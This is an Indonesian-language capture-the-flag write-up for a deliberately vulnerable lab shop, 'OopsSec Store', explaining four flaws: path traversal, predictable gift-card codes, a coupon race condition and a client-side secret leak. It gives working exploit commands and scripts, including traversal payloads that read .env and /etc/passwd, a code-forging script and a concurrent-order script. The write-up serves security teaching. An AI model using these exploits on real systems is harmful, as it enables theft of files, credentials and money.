@@ -1,0 +1,674 @@
+None
+Vulnerability Finding
+1. Path Traversal pada Files API
+Endpoint /api/files?file=... menyajikan dokumen dari folder documents/ tanpa menyanitasi nama
+file, sehingga satu ../ saja sudah cukup untuk keluar dari folder itu dan membaca file mana pun
+yang bisa diakses oleh proses Node.
+Route tersebut membaca query parameter file dan mengembalikan isi file dari folder documents/
+yang berada di root project. Flag berada di flag.txt, satu tingkat di atas folder tersebut.
+Step 1: Confirm normal behaviour
+Minta file yang sah untuk memastikan endpoint berfungsi dan benar-benar membaca file dari
+disk. Respons berupa JSON berisi nama file dan isi mentahnya.
+curl "http://10.10.20.10:8003//api/files?file=readme.txt"
+Step 2: Identify the traversal distance
+Karena documents/ dan flag.txt berbagi direktori induk yang sama (root project), hanya butuh
+satu ../ untuk naik keluar dari documents/.
+
+-- 1 of 32 --
+
+None
+None
+None
+JavaScript
+Step 3: Send the traversal payload
+Kirim payload lewat query parameter file, bisa dengan curl maupun langsung di browser.
+curl "http://10.10.20.10:8003//api/files?file=../flag.txt"
+Step 4: Retrieve the flag
+Respons JSON memuat isi file target, yaitu flag:
+{
+"filename": "../flag.txt",
+"content": "OSS{p4th_tr4v3rs4l_4tt4ck}"
+}
+Additional targets
+Teknik yang sama menjangkau file lain yang bisa dibaca proses aplikasi. Setiap tambahan ../ naik
+satu direktori:
+curl "http://10.10.20.10:8003//api/files?file=../.env"
+curl "http://10.10.20.10:8003//api/files?file=../../../../etc/passwd"
+Vulnerable code analysis
+Handler-nya adalah fungsi GET Next.js yang menggabungkan nilai file dari pengguna ke path
+documents/ lalu langsung membacanya. Contoh pola kode yang rentan
+// app/api/files/route.js
+export function GET(request) {
+const { searchParams } = new URL(request.url);
+
+-- 2 of 32 --
+
+const file = searchParams.get('file');
+const baseDir = path.join(process.cwd(), 'documents');
+const filePath = path.join(baseDir, file); // input tidak divalidasi
+const content = readFileSync(filePath, 'utf-8');
+return NextResponse.json({ filename: file, content });
+}
+Ada tiga masalah:
+1. Input file tidak pernah divalidasi.
+2. path.join() memproses segmen .., tetapi bukan batas keamanan — hasilnya tidak dibatasi
+agar tetap di dalam baseDir.
+3. Kode tidak pernah memeriksa bahwa path akhir masih berada di dalam direktori dasar
+sebelum file dibaca.
+2. Insecure Randomness — Predictable Gift Card
+OopsSec Store menyediakan layanan penjualan gift card digital. Pengguna dapat memilih
+nominal gift card, memasukkan alamat email penerima, kemudian memperoleh kode dengan
+format XXXX-XXXX-XXXX melalui email. Kode tersebut merupakan komponen utama yang
+digunakan untuk melakukan transaksi. Siapa pun yang memiliki kode tersebut dapat
+menggunakannya untuk melakukan penukaran.
+Permasalahan muncul karena kode gift card tidak dihasilkan secara acak dengan mekanisme
+yang aman. Kode tersebut dihasilkan menggunakan algoritma Linear Congruential Generator
+(LCG) yang menggunakan timestamp createdAt dalam satuan milidetik sebagai nilai seed.
+Aplikasi juga menampilkan timestamp tersebut secara presisi hingga milidetik pada halaman
+/profile/gift-cards dan endpoint GET /api/gift-cards.
+Dengan demikian, nilai seed dapat diketahui melalui respons aplikasi, sedangkan algoritma
+pembentukan kode dapat diketahui melalui source code aplikasi. Kombinasi keduanya
+memungkinkan kode gift card direkonstruksi melalui perhitungan matematis.
+
+-- 3 of 32 --
+
+Website dapat diakses melalui http://10.10.20.10:8003/. Terdapat dua akun demo yang digunakan
+dalam skenario pengujian ini:
+● alice@example.com / iloveduck — pengguna yang membeli gift card senilai $500 yang
+telah disediakan sebelumnya.
+● bob@example.com / qwerty — pengguna terautentikasi lainnya yang berperan sebagai
+penyerang dalam skenario ini.
+Login menggunakan akun Alice, kemudian akses halaman /profile/gift-cards. Pada halaman
+tersebut terdapat satu gift card yang telah disediakan sebelumnya dengan informasi berikut:
+● Recipient: forgotten-friend@oopssec.store
+● Amount: $500.00
+● Status: Pending
+● Sent on: Jan 15, 2025, 10:42:33 AM.456 (atau format waktu serupa sesuai pengaturan
+lokal).
+Bagian .456 pada timestamp tersebut bukan sekadar format tampilan. Angka tersebut
+menunjukkan nilai milidetik yang digunakan sebagai seed dalam proses pembentukan kode gift
+card.
+
+-- 4 of 32 --
+
+None
+None
+None
+None
+Klik tombol Resend email pada gift card tersebut. Aplikasi akan menampilkan pesan:
+Email service temporarily unavailable
+Endpoint tersebut selalu menghasilkan kegagalan. Kondisi ini dirancang agar server tidak
+mengembalikan kode gift card kepada pengguna melalui mekanisme pengiriman ulang email,
+termasuk kepada pengguna yang secara sah melakukan pembelian.
+Respons yang sama juga dapat diverifikasi melalui API:
+curl -X POSThttp://10.10.20.10:8003//api/gift-cards/resend \
+-H "Content-Type: application/json" \
+-H "Cookie: authToken=<alice-authToken>" \
+-d '{"id":"gc-seeded-001"}'
+Respons:
+{ "error": "Email service temporarily unavailable" }
+Hal serupa ditemukan pada endpoint GET /api/gift-cards. Endpoint tersebut mengembalikan
+metadata gift card, tetapi tidak menyertakan field kode gift card. Meskipun demikian, nilai
+createdAt tetap tersedia dalam respons:
+{
+"id": "gc-seeded-001",
+
+-- 5 of 32 --
+
+None
+"amount": 500,
+"recipientEmail": "forgotten-friend@oopssec.store",
+"status": "PENDING",
+"createdAt": "2025-01-15T10:42:33.456Z"
+}
+Understanding the vulnerability
+Algoritma pembentukan kode gift card terdapat pada file lib/gift-card.ts:
+const ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"; // 32 chars
+function nextState(state: number): number {
+return (Math.imul(state, 1103515245) + 12345) & 0x7fffffff;
+}
+export function generateGiftCardCode(seed: number): string {
+let state = seed & 0x7fffffff;
+const chars: string[] = [];
+for (let i = 0; i < 12; i++) {
+state = nextState(state);
+const index = (state >>> 16) % ALPHABET.length;
+chars.push(ALPHABET[index]);
+
+-- 6 of 32 --
+
+}
+// returns XXXX-XXXX-XXXX
+...
+}
+Terdapat tiga hal utama yang menunjukkan kelemahan pada mekanisme pembentukan kode
+tersebut:
+● Penggunaan konstanta yang sudah ditentukan (Hard-coded Magic Numbers). Nilai
+1103515245 dan 12345 bukanlah angka yang dipilih secara acak. Keduanya merupakan
+konstanta yang digunakan dalam fungsi rand() pada C Standard Library, sebagaimana
+diimplementasikan pada glibc, BSD, dan dijelaskan dalam referensi Numerical Recipes.
+Penggunaan konstanta tersebut menunjukkan bahwa algoritma yang digunakan merupakan
+implementasi klasik dari Pseudo-Random Number Generator (PRNG).
+● Tidak adanya sumber entropi (No Entropy). Algoritma menghasilkan keluaran yang sama
+apabila diberikan nilai seed yang sama. Hal ini menyebabkan hasil generator dapat
+diprediksi. Berbeda dengan mekanisme pembangkitan bilangan acak yang aman secara
+kriptografis, algoritma ini tidak menggunakan sumber entropi dari sistem operasi, seperti
+crypto.randomBytes pada Node.js atau /dev/urandom pada Linux.
+● Nilai seed dapat diketahui oleh penyerang (Attacker-Observable Seed). Algoritma hanya
+menggunakan timestamp sistem dalam satuan milidetik sebagai nilai seed. Aplikasi justru
+mengembalikan timestamp tersebut kepada pengguna melalui halaman /profile/gift-cards
+dan respons API.
+Where the Seed Lives in the Response
+Endpoint pembelian POST /api/gift-cards membuat nilai createdAt menggunakan new Date(),
+kemudian meneruskannya ke fungsi generateGiftCardCode(createdAt.getTime()).
+
+-- 7 of 32 --
+
+None
+Nilai createdAt selanjutnya disimpan ke dalam database, dikembalikan melalui endpoint GET
+/api/gift-cards, dan ditampilkan pada halaman /profile/gift-cards.
+Dengan demikian, timestamp yang tersedia pada salah satu lokasi tersebut dapat digunakan
+untuk mengetahui nilai seed secara presisi hingga milidetik.
+Why Math.imul?
+Operasi perkalian antara state 31-bit dengan konstanta 1103515245 berpotensi menghasilkan
+nilai yang melampaui batas presisi integer aman JavaScript sebesar 53-bit.
+Fungsi Math.imul digunakan untuk melakukan perkalian integer 32-bit secara presisi sesuai
+dengan definisi algoritma LCG.
+Ketika algoritma tersebut diimplementasikan kembali menggunakan Python, perhitungan dapat
+dilakukan dengan presisi yang sesuai karena Python mendukung integer dengan ukuran arbitrer.
+Exploitation
+Step 1: Read the Target's createdAt
+Login menggunakan akun Alice sebagai pemilik gift card yang telah disediakan sebelumnya,
+kemudian ambil nilai timestamp createdAt.
+Informasi tersebut dapat diperoleh dengan mengakses halaman /profile/gift-cards atau melalui
+API menggunakan perintah berikut:
+curl -s -c cookies.txt -X POST http://http://10.10.20.10:8003//api/auth/login \
+-H "Content-Type: application/json" \
+-d '{"email":"alice@example.com","password":"iloveduck"}' >/dev/null
+
+-- 8 of 32 --
+
+None
+None
+curl -s -b cookies.txthttp://10.10.20.10:8003//api/gift-cards | python3 -m json.tool
+Perhatikan nilai createdAt pada gift card yang ditujukan kepada forgotten-friend@oopssec.store.
+Pada data gift card yang telah disediakan, timestamp tersebut adalah:
+2025-01-15T10:42:33.456Z
+Step 2: Re-implement the LCG and Derive the Code
+Tahap berikutnya adalah mengimplementasikan kembali algoritma LCG menggunakan Python
+untuk menghasilkan kode gift card berdasarkan timestamp yang telah diperoleh.
+#!/usr/bin/env python3
+"""Reproduce the OopsSec Store gift card code from a createdAt timestamp."""
+import datetime
+ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
+MULTIPLIER = 1103515245
+INCREMENT = 12345
+MASK = 0x7fffffff
+def gift_card_code(seed_ms: int) -> str:
+
+-- 9 of 32 --
+
+None
+state = seed_ms & MASK
+chars = []
+for _ in range(12):
+state = (state * MULTIPLIER + INCREMENT) & MASK
+chars.append(ALPHABET[(state >> 16) % len(ALPHABET)])
+return f"{''.join(chars[0:4])}-{''.join(chars[4:8])}-{''.join(chars[8:12])}"
+created_at = datetime.datetime(
+2025, 1, 15, 10, 42, 33, 456000, tzinfo=datetime.timezone.utc
+)
+seed_ms = int(created_at.timestamp() * 1000)
+print(gift_card_code(seed_ms))
+Hasil eksekusi program:
+JQSP-2G6N-G2ZY
+Logika yang sama juga dapat diverifikasi melalui Browser Developer Console menggunakan
+JavaScript:
+
+-- 10 of 32 --
+
+None
+function code(seed) {
+const ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+let s = seed & 0x7fffffff;
+let out = "";
+for (let i = 0; i < 12; i++) {
+s = (Math.imul(s, 1103515245) + 12345) & 0x7fffffff;
+out += ALPHABET[(s >>> 16) % ALPHABET.length];
+if (i === 3 || i === 7) out += "-";
+}
+return out;
+}
+code(new Date("2025-01-15T10:42:33.456Z").getTime());
+// "JQSP-2G6N-G2ZY"
+Step 3: Redeem from a Different Account
+Alamat penerima gift card tersebut adalah forgotten-friend@oopssec.store, yaitu alamat email
+sementara yang tidak dimiliki oleh pengguna lain.
+Kondisi ini menjadi relevan karena mekanisme penukaran gift card tidak melakukan verifikasi
+terhadap identitas pengguna yang melakukan penukaran.
+
+-- 11 of 32 --
+
+None
+None
+Login menggunakan akun Bob, kemudian masukkan kode yang telah diperoleh melalui proses
+rekonstruksi pada halaman /checkout/redeem. Alternatifnya, proses penukaran dapat dilakukan
+langsung melalui API:
+curl -s -c bob.txt -X POST http://10.10.20.10:8003/api/auth/login \
+-H "Content-Type: application/json" \
+-d '{"email":"bob@example.com","password":"qwerty"}' >/dev/null
+curl -s -b bob.txt -X POST http://10.10.20.10:8003/api/gift-cards/redeem \
+-H "Content-Type: application/json" \
+-d '{"code":"JQSP-2G6N-G2ZY"}' | python3 -m json.tool
+Respons yang diperoleh:
+{
+"success": true,
+"amount": 500,
+"balance": 500,
+"flag": "OSS{1ns3cur3_r4nd0mn3ss_g1ft_c4rd}"
+}
+Hasil tersebut menunjukkan bahwa saldo gift card sebesar $500 berhasil ditambahkan ke akun
+Bob, meskipun gift card tersebut dibeli oleh Alice.
+
+-- 12 of 32 --
+
+None
+None
+Flag
+OSS{1ns3cur3_r4nd0mn3ss_g1ft_c4rd}
+Vulnerable Code Analysis
+Implementasi lengkap fungsi pembentukan kode gift card terdapat pada file lib/gift-card.ts:
+function nextState(state: number): number {
+return (Math.imul(state, 1103515245) + 12345) & 0x7fffffff;
+}
+
+-- 13 of 32 --
+
+None
+export function generateGiftCardCode(seed: number): string {
+let state = seed & 0x7fffffff;
+const chars: string[] = [];
+for (let i = 0; i < GROUP_COUNT * GROUP_SIZE; i++) {
+state = nextState(state);
+const index = (state >>> 16) % ALPHABET.length;
+chars.push(ALPHABET[index]);
+}
+const groups: string[] = [];
+for (let g = 0; g < GROUP_COUNT; g++) {
+groups.push(chars.slice(g * GROUP_SIZE, (g + 1) * GROUP_SIZE).join(""));
+}
+return groups.join("-");
+}
+Sementara itu, proses pembelian gift card pada file app/api/gift-cards/route.ts menggunakan nilai
+createdAt.getTime() sebagai seed:
+const createdAt = new Date();
+const code = generateGiftCardCode(createdAt.getTime());
+
+-- 14 of 32 --
+
+const giftCard = await prisma.giftCard.create({
+data: {
+code,
+amount,
+recipientEmail,
+message,
+createdAt,
+buyerId: user.id,
+},
+});
+Dengan mengetahui nilai createdAt, kode gift card dapat direkonstruksi secara offline
+menggunakan fungsi generateGiftCardCode(createdAt.getTime()).
+Hal ini menunjukkan bahwa mekanisme pembentukan kode gift card memiliki kelemahan karena
+menggunakan nilai seed yang dapat diamati oleh pengguna.
+3. Race Condition — Single-Use Coupon Abuse (TOCTOU)
+Halaman utama OopsSec Store menampilkan promo FLASHSALE yang memberikan diskon
+sebesar 50% dengan batas penggunaan satu kali. Mekanisme validasi kupon dilakukan dengan
+memeriksa nilai usedCount, membandingkannya dengan maxUses, kemudian meningkatkan nilai
+penghitung tersebut melalui query terpisah.
+
+-- 15 of 32 --
+
+Permasalahan muncul karena kedua proses tersebut tidak dilakukan secara atomik. Ketika 30
+request dikirimkan secara bersamaan, sebagian besar request dapat membaca nilai usedCount =
+0, melewati proses validasi, dan menyelesaikan pesanan dengan potongan harga sebelum proses
+peningkatan nilai penghitung tersimpan.
+Server kemudian mendeteksi bahwa jumlah penggunaan kupon telah melampaui batas yang
+ditentukan dan menyertakan flag pada respons.
+Halaman utama aplikasi menampilkan banner promosi berikut “Limited time offer — use code
+FLASHSALE for 50% off your next order”
+Untuk melakukan pengujian, akses halaman /checkout setelah menambahkan produk ke
+keranjang belanja. Buka bagian Have a promo code?, masukkan kode FLASHSALE, kemudian
+klik tombol Apply.
+Setelah kode diterapkan, total pembayaran akan berkurang sebesar 50%. Kode kupon juga dapat
+dihapus dan diterapkan kembali secara bebas karena proses tersebut belum melakukan perubahan
+data pada database. Kupon baru akan dianggap digunakan ketika pengguna menekan tombol
+Complete Payment.
+
+-- 16 of 32 --
+
+None
+Tempatkan pesanan menggunakan kupon tersebut, kemudian coba lakukan pemesanan kembali
+dengan kode kupon yang sama. Pesanan kedua tetap dapat diproses, tetapi potongan harga tidak
+lagi diterapkan karena nilai usedCount telah mencapai maxUses, yaitu 1.
+Kondisi tersebut menunjukkan bahwa penggunaan kupon secara berurutan telah dibatasi dengan
+benar. Namun, mekanisme pembatasan tersebut tidak mampu menangani beberapa request yang
+diproses secara bersamaan.
+Understanding the Vulnerability
+The TOCTOU Pattern
+Endpoint POST /api/coupon/apply hanya digunakan untuk melakukan pratinjau penggunaan
+kupon. Endpoint tersebut memvalidasi kode kupon dan mengembalikan total pembayaran setelah
+diskon diterapkan tanpa melakukan perubahan pada database.
+Kupon baru akan dianggap digunakan ketika pesanan benar-benar dibuat.
+Endpoint POST /api/orders menjalankan dua operasi database secara berurutan:
+// 1. CHECK — read the current counter
+
+-- 17 of 32 --
+
+const coupon = await prisma.coupon.findUnique({ where: { code } });
+if (coupon.usedCount < coupon.maxUses) {
+// ← all concurrent requests pass this check — they all read usedCount = 0
+// 2. ACT — increment the counter
+const updated = await prisma.coupon.update({
+where: { code: coupon.code },
+data: { usedCount: { increment: 1 } },
+});
+expectedTotal = calculatedTotal * (1 - coupon.discount);
+}
+Setiap operasi tersebut merupakan proses komunikasi terpisah dengan database. Di antara kedua
+operasi tersebut, event loop Node.js masih dapat menangani request lainnya.
+Apabila 30 request menjalankan tahap pertama sebelum salah satu request mencapai tahap
+kedua, seluruh request dapat membaca nilai usedCount = 0. Akibatnya, semua request berhasil
+melewati proses validasi dan kemudian meningkatkan nilai penghitung secara bersamaan.
+Kondisi tersebut menyebabkan nilai usedCount dapat meningkat hingga 30, meskipun batas
+penggunaan kupon (maxUses) hanya ditetapkan sebesar 1.
+Kerentanan ini dikenal sebagai Time-of-Check Time-of-Use (TOCTOU) Race Condition,
+yaitu kondisi ketika terdapat jeda antara proses pemeriksaan suatu kondisi dan penggunaan hasil
+pemeriksaan tersebut. Dalam rentang waktu tersebut, perubahan yang dilakukan oleh request lain
+dapat menyebabkan hasil pemeriksaan menjadi tidak lagi relevan.
+
+-- 18 of 32 --
+
+None
+None
+Why the Flag Appears
+Setelah proses peningkatan nilai penghitung dilakukan, endpoint akan membandingkan nilai
+usedCount terbaru dengan maxUses:
+if (updated.usedCount > coupon.maxUses) {
+couponRaceFlag = "OSS{r4c3_c0nd1t10n_c0up0n_4bus3}";
+}
+Apabila nilai usedCount setelah proses peningkatan melampaui batas penggunaan kupon, server
+akan menyertakan flag pada respons request tersebut.
+Dalam skenario pengujian dengan request yang dikirimkan secara bersamaan, sebagian besar
+request berpotensi menghasilkan kondisi tersebut.
+Exploitation
+Step 1: Get an Authentication Token
+Login ke aplikasi dan ambil cookie authToken yang digunakan sebagai token autentikasi.
+Proses tersebut dapat dilakukan menggunakan perintah berikut:
+curl -s -c cookies.txt -X POST http://10.10.20.10:8003/api/auth/login \
+-H "Content-Type: application/json" \
+-d '{"email":"alice@example.com","password":"iloveduck"}'
+TOKEN=$(grep authToken cookies.txt | awk '{print $NF}')
+echo "Token: $TOKEN"
+
+-- 19 of 32 --
+
+None
+None
+Token yang diperoleh akan digunakan untuk melakukan autentikasi pada request berikutnya.
+Step 2: Preview the Coupon (No Counter Consumed)
+Sebelum melakukan eksploitasi, lakukan pengujian terhadap endpoint pratinjau kupon untuk
+memastikan bahwa proses validasi tidak meningkatkan nilai penghitung penggunaan kupon.
+Gunakan perintah berikut:
+curl -s -X POST http://10.10.20.10:8003/api/coupon/apply \
+-H "Content-Type: application/json" \
+-H "Cookie: authToken=$TOKEN" \
+-d '{"code":"FLASHSALE","cartTotal":100}'
+Respons yang diperoleh:
+{ "discountedTotal": 50, "discountPercent": 50 }
+Pemanggilan endpoint tersebut secara berulang tetap menghasilkan respons yang sama karena
+nilai penghitung penggunaan kupon belum mengalami perubahan.
+Kupon baru akan dianggap digunakan ketika pesanan dibuat dengan menyertakan parameter
+couponCode: "FLASHSALE".
+Tambahkan produk ke keranjang belanja, kemudian buat satu pesanan menggunakan kode kupon
+tersebut. Setelah itu, coba lakukan pemesanan kedua untuk memastikan bahwa diskon tidak lagi
+diterapkan karena kupon telah mencapai batas penggunaannya.
+Mekanisme penggunaan kupon secara berurutan telah terlindungi. Selanjutnya, database perlu
+dikembalikan ke kondisi awal menggunakan perintah berikut:
+
+-- 20 of 32 --
+
+None
+None
+npm run db:seed
+Setelah proses tersebut selesai, pengujian dapat dilanjutkan dengan skenario pengiriman request
+secara bersamaan.
+Step 3: Fire Concurrent Order Requests
+Pada tahap ini, pengujian dilakukan dengan mengirimkan beberapa request pembuatan pesanan
+secara bersamaan menggunakan kode kupon yang sama.
+Python (asyncio + httpx):
+#!/usr/bin/env python3
+"""Race condition exploit: concurrent orders with the same coupon code."""
+import asyncio
+import httpx
+BASE_URL = "http://10.10.20.10:8003/
+TOKEN = "<your-authToken-here>"
+CART_TOTAL = 5.49 # e.g. one Artisan Sourdough Bread — set to your actual cart total
+DISCOUNTED = round(CART_TOTAL * 0.5, 2) # verify this matches your cart
+CONCURRENCY = 30
+
+-- 21 of 32 --
+
+async def place_order(client: httpx.AsyncClient, idx: int) -> dict:
+r = await client.post(
+f"{BASE_URL}/api/orders",
+json={"total": DISCOUNTED, "couponCode": "FLASHSALE"},
+cookies={"authToken": TOKEN},
+)
+result = r.json()
+result["_req"] = idx
+result["_status"] = r.status_code
+return result
+async def main():
+async with httpx.AsyncClient(timeout=10) as client:
+results = await asyncio.gather(
+*[place_order(client, i) for i in range(CONCURRENCY)]
+)
+
+-- 22 of 32 --
+
+None
+successes = [r for r in results if r["_status"] == 200]
+flags = [r for r in successes if "flag" in r]
+print(f"Total requests : {CONCURRENCY}")
+print(f"Successes (200): {len(successes)}")
+print(f"Responses with flag: {len(flags)}")
+if flags:
+print(f"\nFlag: {flags[0]['flag']}")
+else:
+print("\nNo flag yet — try increasing CONCURRENCY or reseeding.")
+asyncio.run(main())
+Jalankan program menggunakan perintah berikut:
+pip install httpx
+python3 exploit.py
+
+-- 23 of 32 --
+
+None
+curl (parallel):
+Alternatif lainnya adalah menggunakan curl dengan bantuan xargs untuk mengirimkan beberapa
+request secara paralel.
+TOKEN="<your-authToken-here>"
+# total must be the discounted amount (CART_TOTAL * 0.5), e.g. 2.75 for a $5.49 cart
+BODY='{"total":2.75,"couponCode":"FLASHSALE"}'
+seq 30 | xargs -P30 -I{} curl -s \
+-X POST http://10.10.20.10:8003/api/orders \
+-H "Content-Type: application/json" \
+-H "Cookie: authToken=$TOKEN" \
+-d "$BODY"
+Burp Suite Intruder:
+Pengujian juga dapat dilakukan menggunakan Burp Suite Intruder.
+1. Tangkap request POST /api/orders yang memiliki parameter couponCode pada bagian
+request body.
+2. Kirim request tersebut ke Intruder.
+3. Atur tipe serangan menjadi Sniper dengan daftar payload kosong sebanyak 30 entri.
+4. Aktifkan konfigurasi Resource pool.
+5. Atur nilai Maximum concurrent requests menjadi 30.
+6. Mulai serangan untuk mengirimkan request secara bersamaan.
+
+-- 24 of 32 --
+
+None
+Step 4: Collect the Flag
+Setelah proses pengiriman request selesai, beberapa respons akan menampilkan informasi seperti
+berikut:
+{
+"id": "ORD-007",
+"total": 2.75,
+"status": "PENDING",
+"flag": "OSS{r4c3_c0nd1t10n_c0up0n_4bus3}"
+}
+Flag akan muncul pada setiap respons yang menghasilkan kondisi ketika nilai usedCount setelah
+proses peningkatan melampaui maxUses.
+Dalam skenario pengujian ini, sebagian besar dari 30 request yang dikirimkan secara bersamaan
+berpotensi menghasilkan respons yang menyertakan flag.
+
+-- 25 of 32 --
+
+None
+Vulnerable Code Analysis
+Implementasi lengkap handler terdapat pada file app/api/orders/route.ts:
+// Step 1 — separate read (the CHECK)
+const coupon = await prisma.coupon.findUnique({
+where: { code: couponCode.toUpperCase() },
+});
+if (
+coupon &&
+(!coupon.expiresAt || coupon.expiresAt >= new Date()) &&
+coupon.usedCount < coupon.maxUses // ← all 30 concurrent requests pass here
+) {
+// Step 2 — separate write (the ACT)
+const updated = await prisma.coupon.update({
+where: { code: coupon.code },
+data: { usedCount: { increment: 1 } }, // ← each increments independently
+});
+expectedTotal = calculatedTotal * (1 - coupon.discount);
+
+-- 26 of 32 --
+
+if (updated.usedCount > coupon.maxUses) {
+couponRaceFlag = "OSS{r4c3_c0nd1t10n_c0up0n_4bus3}";
+}
+}
+Pada implementasi tersebut, terdapat dua pemanggilan Prisma yang dilakukan secara berurutan,
+tetapi tidak dalam satu transaksi atomik.
+Event loop Node.js memungkinkan request lainnya diproses di antara kedua operasi tersebut.
+Karena Prisma menggunakan connection pool dan SQLite mendukung operasi pembacaan secara
+bersamaan, seluruh 30 pemanggilan findUnique berpotensi selesai sebelum operasi update
+pertama dijalankan.
+Akibatnya, seluruh request dapat membaca nilai usedCount yang sama, melewati proses
+pemeriksaan batas penggunaan kupon, dan kemudian meningkatkan nilai penghitung secara
+terpisah.
+Kondisi tersebut memungkinkan batas penggunaan kupon dilampaui meskipun aplikasi telah
+menerapkan pemeriksaan terhadap jumlah penggunaan sebelumnya.
+4. Client-Side Secret Leak (NEXT_PUBLIC_)
+Environment variable yang menggunakan prefiks NEXT_PUBLIC_ dalam proyek Next.js akan
+disisipkan ke dalam JavaScript bundle sisi klien pada saat proses build. Browser menerima nilai
+tersebut secara langsung, sehingga siapa pun dapat membacanya melalui Network Panel atau
+dengan mencari file statis di direktori /_next/static/chunks/.
+Pada challenge OopsSec Store, sebuah kredensial pembayaran disimpan menggunakan prefiks
+tersebut dan dikirimkan sebagai custom HTTP header dari halaman checkout. Untuk
+mendapatkan nilainya, cukup dengan memeriksa satu request melalui browser.
+
+-- 27 of 32 --
+
+Gambaran Umum Kerentanan
+Halaman checkout membaca nilai process.env.NEXT_PUBLIC_PAYMENT_SECRET dan
+menyertakannya ke dalam request pemesanan melalui header X-Payment-Auth.
+Karena variabel tersebut menggunakan prefiks NEXT_PUBLIC_, compiler Next.js akan
+mengganti pemanggilan variabel tersebut dengan nilai string secara langsung pada saat proses
+build. Setiap pengunjung yang membuka halaman checkout akan mengunduh kredensial tersebut
+sebagai bagian dari JavaScript halaman, terlepas dari apakah mereka menekan tombol Complete
+Payment atau tidak.
+Kesalahan konfigurasi seperti ini cukup umum ditemukan pada codebase aplikasi produksi.
+Prefiks NEXT_PUBLIC_ sering disalahartikan sebagai aturan pembatasan akses, seolah-olah
+hanya berarti “tersedia untuk kode aplikasi”. Padahal, fungsi sebenarnya adalah memublikasikan
+nilai tersebut agar dapat diakses oleh seluruh client.
+Menemukan Attack Surface
+Kerentanan dapat diakses melalui halaman checkout pada endpoint /checkout. Setelah
+menambahkan produk ke keranjang dan melanjutkan proses checkout, halaman akan
+menampilkan ringkasan pembayaran.
+
+-- 28 of 32 --
+
+None
+Ketika formulir dikirimkan, aplikasi akan mengirimkan request POST /api/orders. Antarmuka
+pengguna tidak menampilkan informasi sensitif apa pun, sehingga kebocoran ini tidak dapat
+diamati secara langsung dari halaman yang dirender.
+Eksploitasi
+1. Login dan Akses Halaman Checkout
+Login menggunakan akun yang telah disediakan (contohnya alice@example.com / iloveduck),
+tambahkan minimal satu produk ke keranjang, kemudian navigasikan ke halaman /checkout.
+2. Buka DevTools dan Tangkap Request Pemesanan
+Buka Developer Tools pada browser (F12, atau Cmd+Option+I pada macOS), kemudian pilih tab
+Network.
+Klik tombol Complete Payment dan cari request POST /api/orders pada daftar request yang
+muncul.
+3. Periksa Request Header yang Dikirimkan
+Pada panel Headers, gulir ke bagian Request Headers. Frontend telah menyertakan custom
+header yang bukan merupakan bagian dari request browser normal:
+X-Payment-Auth: T1NTe3B1YmxpY18zbnZpcjBubWVudF92NHJpNGJsM30=
+
+-- 29 of 32 --
+
+None
+None
+4. Decode Nilai yang Berhasil Ditangkap
+Nilai tersebut dienkode menggunakan Base64. Lakukan decoding melalui tab Console dengan
+perintah berikut:
+atob("T1NTe3B1YmxpY18zbnZpcjBubWVudF92NHJpNGJsM30=");
+Hasil decoding merupakan flag:
+OSS{public_3nvir0nment_v4ri4bl3}
+5. Konfirmasi Nilai Tertanam di Static Bundle
+String yang sama juga dapat ditemukan tanpa harus mengirimkan request apa pun.
+Buka tab Sources, kemudian lakukan pencarian secara global (Ctrl+Shift+F, atau
+Cmd+Option+F pada macOS). Cari nilai string tersebut, lalu Chrome akan menunjukkan file
+hasil minifikasi yang berada di direktori /_next/static/chunks/.
+
+-- 30 of 32 --
+
+None
+String tersebut disisipkan secara langsung ke dalam compiled chunk untuk checkout client
+component.
+Analisis Kode yang Rentan
+Checkout client component membaca environment variable dan menyertakannya ke dalam
+request pemesanan:
+const paymentSecret = process.env.NEXT_PUBLIC_PAYMENT_SECRET ?? "";
+const order = await api.post(
+"/api/orders",
+{
+total: discountedTotal ?? cartData.total,
+},
+{
+
+-- 31 of 32 --
+
+headers: { "X-Payment-Auth": paymentSecret },
+}
+);
+Selama 	proses 	production 	build, 	compiler 	SWC 	akan 	mengganti
+process.env.NEXT_PUBLIC_PAYMENT_SECRET dengan string literal yang didefinisikan di
+dalam environment file.
+Selanjutnya, minifier akan mengubah nama identifier lokal, tetapi nilai yang telah disisipkan
+tersebut tetap dipertahankan. Akibatnya, string NEXT_PUBLIC_PAYMENT_SECRET tidak
+lagi muncul di dalam bundle, sedangkan nilai rahasianya tetap tersedia.
+Pencarian berdasarkan nama variabel mungkin tidak menghasilkan apa pun. Sebaliknya,
+pencarian menggunakan pola nilai tertentu, seperti string Base64 yang panjang, sk_live_, pk_,
+atau JWT token, dapat membantu menemukan kebocoran tersebut.
+Dokumentasi Next.js menjelaskan perilaku ini secara eksplisit. Namun, prefiks tersebut masih
+sering disalahartikan oleh developer. Banyak developer menganggap NEXT_PUBLIC_ sebagai
+modifier untuk membatasi cakupan akses, padahal fungsinya lebih menyerupai penanda
+publikasi. Dengan demikian, setiap nilai yang menggunakan prefiks tersebut akan dimasukkan
+ke dalam static asset bundle yang didistribusikan kepada seluruh client.
+
+-- 32 of 32 --
+
